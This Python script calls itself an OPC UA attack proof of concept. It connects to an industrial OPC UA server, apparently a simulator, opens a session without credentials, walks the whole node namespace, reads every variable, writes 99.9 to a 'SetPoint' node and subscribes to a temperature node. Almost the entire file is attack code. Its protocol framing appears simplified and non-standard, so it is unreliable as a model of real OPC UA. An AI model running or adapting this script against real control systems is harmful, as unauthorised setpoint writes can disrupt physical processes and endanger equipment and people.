"""
OPC UA Advanced Attack PoC — 6-stage simulated attack sequence.
Connects to an OPC UA simulator, enumerates nodes, reads/writes values,
and subscribes to notifications.

Usage: python advanced_attack.py host [port]
"""
import socket
import struct
import sys
import time
import logging
import uuid

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
log = logging.getLogger("AttackPoC")

SERVICE_GET_ENDPOINTS       = 428
SERVICE_CREATE_SESSION      = 461
SERVICE_ACTIVATE_SESSION    = 466
SERVICE_BROWSE              = 525
SERVICE_BROWSE_NEXT         = 526
SERVICE_READ                = 629
SERVICE_WRITE               = 669
SERVICE_CREATE_SUBSCRIPTION = 781
SERVICE_CREATE_MON_ITEMS    = 745
SERVICE_PUBLISH             = 822

NODECLASS_FOLDER   = 8
NODECLASS_OBJECT   = 1
NODECLASS_VARIABLE = 2

TYPE_BOOLEAN  = 1
TYPE_INT32    = 6
TYPE_DOUBLE   = 11
TYPE_STRING   = 12
TYPE_FLOAT    = 10
TYPE_INT64    = 8

DEFAULT_BROWSE_NODES = [
    "i=84",
    "ns=1;s=DeviceSet",
    "ns=1;s=Sensors",
    "ns=1;s=Actuators",
    "ns=1;s=Alarms",
    "ns=2;s=Diagnostics",
    "ns=2;s=Config",
    "ns=2;s=StaticData",
]


class OpcUaClient:
    def __init__(self, host, port=4840):
        self.host = host
        self.port = port
        self.sock = None
        self.channel_id = 0
        self.token_id = 0
        self.session_id = ""
        self.auth_token = ""
        self.seq_number = 1
        self.request_handle = 1000
        self.discovered_nodes = {}
        self.active = False

    # ------------------------------------------------------------------ #
    #  Connection & low-level I/O                                         #
    # ------------------------------------------------------------------ #
    def connect(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(10)
        self.sock.connect((self.host, self.port))
        log.info("Connected to %s:%d", self.host, self.port)

    def close(self):
        if self.sock:
            try:
                self.sock.shutdown(socket.SHUT_RDWR)
            except Exception:
                pass
            self.sock.close()
        self.sock = None

    def _send_chunk(self, msg_type, body):
        """Build and send a chunk: [size:4 BE][0x00][msg_type:3][body]"""
        total_len = 8 + len(body)
        header = struct.pack(">IBBBB", total_len, 0,
                             msg_type[0], msg_type[1], msg_type[2])
        self.sock.sendall(header + body)

    def _recv_chunk(self):
        """Receive exactly one chunk. Returns (msg_type, body)."""
        hdr = self._recv_exact(8)
        msg_len = struct.unpack(">I", hdr[:4])[0]
        msg_type = hdr[5:8].decode(errors="replace")
        remaining = msg_len - 8
        body = self._recv_exact(remaining) if remaining > 0 else b""
        return msg_type, body

    def _recv_exact(self, n):
        buf = b""
        while len(buf) < n:
            chunk = self.sock.recv(n - len(buf))
            if not chunk:
                raise ConnectionError("Connection closed")
            buf += chunk
        return buf

    def _next_handle(self):
        h = self.request_handle
        self.request_handle += 1
        return h

    # ------------------------------------------------------------------ #
    #  Stage 1: Hello handshake + service discovery                       #
    # ------------------------------------------------------------------ #
    def stage1_hello_and_discover(self):
        log.info("=== STAGE 1: Hello handshake + GetEndpoints ===")

        body = struct.pack(">IIIII", 0, 65536, 65536, 0, 0)
        body += b"opc.tcp://%s:%d/" % (self.host.encode(), self.port)
        self._send_chunk(b"HEL", body)
        log.info("[S1] Hello sent")

        msg_type, body = self._recv_chunk()
        if msg_type != "ACK":
            log.error("[S1] Expected ACK, got %s", msg_type)
            return False
        recv_buf = struct.unpack(">I", body[:4])[0]
        send_buf = struct.unpack(">I", body[4:8])[0]
        log.info("[S1] ACK received: recv_buf=%d send_buf=%d", recv_buf, send_buf)

        if not self._open_channel():
            return False
        resp = self._call_service(SERVICE_GET_ENDPOINTS, b"", expect_handle=True)
        endpoints = self._parse_endpoints(resp)
        log.info("[S1] Discovered %d endpoints:", len(endpoints))
        for ep in endpoints:
            log.info("[S1]   %s (policy=%s)", ep.get("url", "?"), ep.get("policy", "?"))
        return True

    # ------------------------------------------------------------------ #
    #  Stage 2: OpenSecureChannel + CreateSession                         #
    # ------------------------------------------------------------------ #
    def _open_channel(self):
        body = struct.pack(">IIII", 0, 0, 0, 1)
        self._send_chunk(b"OPN", body)
        log.info("[S2] OpenSecureChannel sent")

        msg_type, body = self._recv_chunk()
        if msg_type != "OPN":
            log.error("[S2] Expected OPN, got %s", msg_type)
            return False
        self.channel_id = struct.unpack(">I", body[0:4])[0]
        self.token_id = struct.unpack(">I", body[4:8])[0]
        log.info("[S2] Channel opened: id=%d token=%d", self.channel_id, self.token_id)
        return True

    def stage2_create_session(self):
        log.info("=== STAGE 2: CreateSession + ActivateSession ===")
        # CreateSession
        sname = b"AttackPoC"
        aname = b"AdvancedAttack/1.0"
        body = struct.pack("<B", len(sname)) + sname
        body += struct.pack("<B", len(aname)) + aname
        body += struct.pack("<I", 3600)
        resp = self._call_service(SERVICE_CREATE_SESSION, body, expect_handle=True)
        if not resp:
            return False

        # Parse session id and auth token
        self.session_id, self.auth_token = self._parse_session_response(resp)
        log.info("[S2] Session created: %s", self.session_id)

        # ActivateSession
        sid_enc = self._encode_node_id_str(self.session_id)
        resp2 = self._call_service(SERVICE_ACTIVATE_SESSION, sid_enc, expect_handle=True)
        log.info("[S2] Session activated")
        self.active = True
        return True

    def _parse_session_response(self, data):
        """Parse CreateSession response to extract session_id and auth_token."""
        if len(data) < 10:
            return "", ""
        pos = 6
        sid_enc = data[pos]; pos += 1
        if sid_enc == 0:
            val = struct.unpack("<H", data[pos:pos+2])[0]; pos += 2
            sid = "i=%d" % val
        elif sid_enc == 1:
            ns, val = struct.unpack("<HH", data[pos:pos+4]); pos += 4
            sid = "ns=%d;i=%d" % (ns, val)
        elif sid_enc == 2:
            ns = struct.unpack("<H", data[pos:pos+2])[0]; pos += 2
            slen = data[pos]; pos += 1
            sval = data[pos:pos+slen].decode(errors="replace"); pos += slen
            sid = "ns=%d;s=%s" % (ns, sval)
        else:
            sid = "unknown"

        if pos + 1 <= len(data):
            auth_enc = data[pos]; pos += 1
            if auth_enc == 2:
                ns = struct.unpack("<H", data[pos:pos+2])[0]; pos += 2
                slen = data[pos]; pos += 1
                auth = data[pos:pos+slen].decode(errors="replace"); pos += slen
            elif auth_enc == 0:
                val = struct.unpack("<H", data[pos:pos+2])[0]; pos += 2
                auth = "i=%d" % val
            else:
                auth = "unknown"
        else:
            auth = ""
        return sid, auth

    # ------------------------------------------------------------------ #
    #  Stage 3: Browse entire server namespace                            #
    # ------------------------------------------------------------------ #
    def stage3_browse_all(self):
        log.info("=== STAGE 3: Browse server namespace ===")
        all_nodes = {}
        pending = list(DEFAULT_BROWSE_NODES)
        browsed = set()

        while pending:
            node_id = pending.pop(0)
            if node_id in browsed:
                continue
            browsed.add(node_id)

            refs = self._browse_node(node_id)
            if refs is None:
                log.warning("[S3] Browse failed for %s", node_id)
                continue
            all_nodes[node_id] = refs
            log.info("[S3] %s → %d children", node_id, len(refs))
            for node_class, child_id, bname, dname in refs:
                if child_id not in browsed and node_class in (NODECLASS_FOLDER, NODECLASS_OBJECT):
                    pending.append(child_id)
                if child_id not in self.discovered_nodes:
                    self.discovered_nodes[child_id] = (bname, dname, node_class)

        log.info("[S3] Total discovered nodes: %d", len(self.discovered_nodes))
        self._print_node_tree()
        return True

    def _browse_node(self, node_id):
        """Browse a single node, return list of (node_class, node_id, bname, dname)."""
        nid_enc = self._encode_node_id_str(node_id)
        body = struct.pack("<IIIB", 0, 0, 0, 1)
        body += struct.pack("<H", 1) + nid_enc
        resp = self._call_service(SERVICE_BROWSE, body, expect_handle=True)
        if not resp or len(resp) < 12:
            return None
        status = struct.unpack("<I", resp[6:10])[0]
        if status != 0:
            return None
        result_count = struct.unpack("<H", resp[10:12])[0]
        refs = []
        pos = 12
        for _ in range(result_count):
            if pos + 7 > len(resp):
                break
            r_status = struct.unpack("<I", resp[pos:pos+4])[0]; pos += 4
            cp_len = resp[pos]; pos += 1
            if cp_len:
                pos += cp_len
                continue
            ref_count = struct.unpack("<H", resp[pos:pos+2])[0]; pos += 2
            for _ in range(ref_count):
                if pos + 3 > len(resp):
                    break
                child_info, pos = self._decode_node_id(resp, pos)
                child_id = child_info["full_id"]
                if pos + 1 > len(resp):
                    break
                bn_len = resp[pos]; pos += 1
                bname = resp[pos:pos+bn_len].decode(errors="replace") if bn_len > 0 else ""
                pos += bn_len
                if pos + 1 > len(resp):
                    break
                dn_len = resp[pos]; pos += 1
                dname = resp[pos:pos+dn_len].decode(errors="replace") if dn_len > 0 else ""
                pos += dn_len
                nc = resp[pos] if pos < len(resp) else 1; pos += 1
                refs.append((nc, child_id, bname, dname))
        return refs

    def _print_node_tree(self):
        variables = {k: v for k, v in self.discovered_nodes.items() if v[2] == NODECLASS_VARIABLE}
        folders = {k: v for k, v in self.discovered_nodes.items() if v[2] == NODECLASS_FOLDER}
        objects = {k: v for k, v in self.discovered_nodes.items() if v[2] == NODECLASS_OBJECT}
        log.info("[S3] Folders: %d  Objects: %d  Variables: %d",
                 len(folders), len(objects), len(variables))
        for nid, (bname, dname, _) in sorted(variables.items(), key=lambda x: x[1][0]):
            log.info("[S3]   Variable: %s (%s)", bname, nid)

    # ------------------------------------------------------------------ #
    #  Stage 4: Read all discovered variables                             #
    # ------------------------------------------------------------------ #
    def stage4_read_all(self):
        log.info("=== STAGE 4: Read all device variables ===")
        variables = {k: v for k, v in self.discovered_nodes.items() if v[2] == NODECLASS_VARIABLE}
        read_these = [nid for nid in sorted(variables.keys())]

        if not read_these:
            log.warning("[S4] No variables found to read")
            return False

        log.info("[S4] Reading %d variables in batches of 10", len(read_these))
        results = {}
        for i in range(0, len(read_these), 10):
            batch = read_these[i:i+10]
            body = struct.pack("<dIII", 0.0, 13, 0, 0)
            body += struct.pack("<H", len(batch))
            for nid in batch:
                body += self._encode_node_id_str(nid)
            resp = self._call_service(SERVICE_READ, body, expect_handle=True)
            if resp:
                batch_results = self._parse_read_response(resp, batch)
                results.update(batch_results)

        log.info("[S4] Read %d variable values:", len(results))
        for nid, val in sorted(results.items()):
            name = self.discovered_nodes.get(nid, ("?", "?"))[0]
            log.info("[S4]   %s = %s", name, str(val)[:60])
        return True

    def _parse_read_response(self, data, node_ids):
        if len(data) < 12:
            return {}
        status = struct.unpack("<I", data[6:10])[0]
        result_count = struct.unpack("<H", data[10:12])[0]
        results = {}
        pos = 12
        for i in range(min(result_count, len(node_ids))):
            if pos + 5 > len(data):
                break
            r_status = struct.unpack("<I", data[pos:pos+4])[0]; pos += 4
            val_type = data[pos]; pos += 1
            val_len = struct.unpack("<I", data[pos:pos+4])[0]; pos += 4
            val_bytes = data[pos:pos+val_len] if val_len < len(data) - pos else b""
            pos += val_len
            pos += 8
            results[node_ids[i]] = self._decode_value(val_type, val_bytes)
        return results

    # ------------------------------------------------------------------ #
    #  Stage 5: Write to a test variable                                 #
    # ------------------------------------------------------------------ #
    def stage5_write_test(self, target_node="ns=1;s=SetPoint", test_value=99.9):
        log.info("=== STAGE 5: Write to %s ===", target_node)

        val_type = TYPE_DOUBLE
        val_enc = struct.pack("<d", test_value)
        body = struct.pack("<H", 1)
        body += self._encode_node_id_str(target_node)
        body += struct.pack("<BI", val_type, len(val_enc)) + val_enc
        resp = self._call_service(SERVICE_WRITE, body, expect_handle=True)

        if resp and len(resp) >= 16:
            result_count = struct.unpack("<H", resp[10:12])[0]
            write_status = struct.unpack("<I", resp[12:16])[0]
            if write_status == 0:
                log.info("[S5] Write to %s = %s SUCCESS (status=0x%08X)",
                         target_node, test_value, write_status)
            else:
                log.warning("[S5] Write status: 0x%08X", write_status)
        else:
            log.error("[S5] Write failed: no valid response")

        # Verify by reading back
        body2 = struct.pack("<dIII", 0.0, 13, 0, 0)
        body2 += struct.pack("<H", 1) + self._encode_node_id_str(target_node)
        resp2 = self._call_service(SERVICE_READ, body2, expect_handle=True)
        if resp2:
            vals = self._parse_read_response(resp2, [target_node])
            log.info("[S5] Read-back verification: %s = %s", target_node, vals.get(target_node, "?"))
        return True

    # ------------------------------------------------------------------ #
    #  Stage 6: Subscribe + receive notifications                         #
    # ------------------------------------------------------------------ #
    def stage6_subscribe(self, monitor_node="ns=1;s=Temperature"):
        log.info("=== STAGE 6: Subscribe to %s ===", monitor_node)

        body = struct.pack("<dIIII", 0.5, 10, 3, 1, 0)
        resp = self._call_service(SERVICE_CREATE_SUBSCRIPTION, body, expect_handle=True)
        if not resp or len(resp) < 14:
            log.error("[S6] Subscription creation failed")
            return False
        sub_id = struct.unpack("<I", resp[10:14])[0]
        log.info("[S6] Subscription created: id=%d", sub_id)

        body2 = struct.pack("<II", sub_id, 0)
        body2 += struct.pack("<H", 1)
        body2 += self._encode_node_id_str(monitor_node)
        body2 += struct.pack("<dIB", 0.5, 1, 1)
        resp2 = self._call_service(SERVICE_CREATE_MON_ITEMS, body2, expect_handle=True)
        if not resp2 or len(resp2) < 18:
            log.error("[S6] Monitored item creation failed")
            return False
        mon_id = struct.unpack("<I", resp2[14:18])[0]
        log.info("[S6] Monitored item: mon_id=%d for %s", mon_id, monitor_node)

        log.info("[S6] Polling for notifications (3 cycles)...")
        for cycle in range(3):
            body3 = struct.pack("<H", 0)
            resp3 = self._call_service(SERVICE_PUBLISH, body3, expect_handle=True)
            if resp3 and len(resp3) >= 20:
                rsub_id = struct.unpack("<I", resp3[10:14])[0]
                seq = struct.unpack("<I", resp3[14:18])[0]
                ncount = resp3[19] if len(resp3) > 19 else 0
                if ncount > 0:
                    pos = 20
                    for _ in range(ncount):
                        if pos + 14 > len(resp3):
                            break
                        mid = struct.unpack("<I", resp3[pos:pos+4])[0]; pos += 4
                        handle = struct.unpack("<I", resp3[pos:pos+4])[0]; pos += 4
                        val_type = resp3[pos]; pos += 1
                        val_len = struct.unpack("<I", resp3[pos:pos+4])[0]; pos += 4
                        val_bytes = resp3[pos:pos+val_len]; pos += val_len
                        val = self._decode_value(val_type, val_bytes)
                        log.info("[S6]   Notification: mon=%d value=%s", mid, str(val)[:50])
                else:
                    log.info("[S6]   Cycle %d: no notifications (seq=%d)", cycle, seq)
            time.sleep(1.0)
        log.info("[S6] Subscription test complete")
        return True

    # ------------------------------------------------------------------ #
    #  MSG service call helper                                            #
    # ------------------------------------------------------------------ #
    def _call_service(self, service_id, body, expect_handle=False):
        if not self.sock:
            return None
        handle = self._next_handle()
        svc_body = struct.pack("<HI", service_id, handle) + body
        msg_body = struct.pack(">IIII", self.channel_id, self.token_id,
                               self.seq_number, handle) + svc_body
        self._send_chunk(b"MSG", msg_body)
        self.seq_number += 1

        msg_type, resp_body = self._recv_chunk()
        if resp_body and len(resp_body) >= 22:
            resp_svc_id = struct.unpack("<H", resp_body[16:18])[0]
            if resp_svc_id == service_id:
                return resp_body[16:]
        return resp_body[16:] if resp_body else None

    # ------------------------------------------------------------------ #
    #  NodeId encoding / value decoding (client-side)                     #
    # ------------------------------------------------------------------ #
    def _encode_node_id_str(self, full_id):
        if full_id.startswith("ns="):
            parts = full_id.split(";", 1)
            ns = int(parts[0][3:])
            rest = parts[1]
            if rest.startswith("s="):
                s = rest[2:].encode()
                return struct.pack("<BH", 2, ns) + struct.pack("<B", len(s)) + s
            elif rest.startswith("i="):
                return struct.pack("<BHH", 1, ns, int(rest[2:]))
            elif rest.startswith("b="):
                b = bytes.fromhex(rest[2:])
                return struct.pack("<BH", 4, ns) + struct.pack("<B", len(b)) + b
        elif full_id.startswith("i="):
            return struct.pack("<BH", 0, int(full_id[2:]))
        return struct.pack("<BH", 0, 0)

    def _decode_node_id(self, data, pos):
        if pos >= len(data):
            return {"full_id": ""}, pos
        enc = data[pos]; pos += 1
        ns, val, sval = 0, 0, ""
        full_id = ""
        if enc == 0 and pos + 2 <= len(data):
            val = struct.unpack("<H", data[pos:pos+2])[0]; pos += 2
            full_id = "i=%d" % val
        elif enc == 1 and pos + 4 <= len(data):
            ns, val = struct.unpack("<HH", data[pos:pos+4]); pos += 4
            full_id = "ns=%d;i=%d" % (ns, val)
        elif enc == 2 and pos + 3 <= len(data):
            ns = struct.unpack("<H", data[pos:pos+2])[0]; pos += 2
            slen = data[pos]; pos += 1
            if pos + slen <= len(data):
                sval = data[pos:pos+slen].decode(errors="replace"); pos += slen
                full_id = "ns=%d;s=%s" % (ns, sval)
        return {"full_id": full_id, "ns": ns, "id": val, "string_id": sval}, pos

    def _decode_value(self, val_type, data):
        if not data:
            return None
        try:
            if val_type == 1:
                return data[0] != 0
            elif val_type == 6:
                return struct.unpack("<i", data[:4])[0] if len(data) >= 4 else 0
            elif val_type == 7:
                return struct.unpack("<I", data[:4])[0] if len(data) >= 4 else 0
            elif val_type == 8:
                return struct.unpack("<q", data[:8])[0] if len(data) >= 8 else 0
            elif val_type == 10:
                return struct.unpack("<f", data[:4])[0] if len(data) >= 4 else 0.0
            elif val_type == 11:
                return struct.unpack("<d", data[:8])[0] if len(data) >= 8 else 0.0
            elif val_type == 12:
                return data.decode(errors="replace")
            elif val_type == 15:
                return data.hex()
            else:
                return data.decode(errors="replace") if data else ""
        except Exception:
            return data.hex()

    def _parse_endpoints(self, data):
        if len(data) < 12:
            return []
        result_count = struct.unpack("<H", data[10:12])[0]
        endpoints = []
        pos = 12
        for _ in range(result_count):
            if pos + 1 > len(data):
                break
            url_len = data[pos]; pos += 1
            url = data[pos:pos+url_len].decode(errors="replace"); pos += url_len
            if pos + 1 > len(data):
                break
            pol_len = data[pos]; pos += 1
            policy = data[pos:pos+pol_len].decode(errors="replace"); pos += pol_len
            if pos + 2 > len(data):
                break
            mode = data[pos]; pos += 1
            level = data[pos]; pos += 1
            endpoints.append({"url": url, "policy": policy, "mode": mode, "level": level})
        return endpoints


def main():
    if len(sys.argv) < 2:
        log.info("Usage: python advanced_attack.py host [port]")
        log.info("Example: python advanced_attack.py 127.0.0.1 4840")
        return

    host = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 4840

    client = OpcUaClient(host, port)
    try:
        client.connect()

        # Stage 1: Hello + service discovery
        if not client.stage1_hello_and_discover():
            log.error("Stage 1 failed")
            return

        # Stage 2: Create/Activate session
        if not client.stage2_create_session():
            log.error("Stage 2 failed")
            return

        # Stage 3: Browse entire namespace
        if not client.stage3_browse_all():
            log.warning("Stage 3 had issues")

        # Stage 4: Read all variables
        if not client.stage4_read_all():
            log.warning("Stage 4 had issues")

        # Stage 5: Write to a variable
        if not client.stage5_write_test():
            log.warning("Stage 5 had issues")

        # Stage 6: Subscribe and receive notifications
        if not client.stage6_subscribe():
            log.warning("Stage 6 had issues")

        log.info("=== Attack sequence complete ===")
    except KeyboardInterrupt:
        log.info("Interrupted by user")
    except Exception as e:
        log.error("Exception during attack: %s", e)
    finally:
        client.close()


if __name__ == "__main__":
    main()
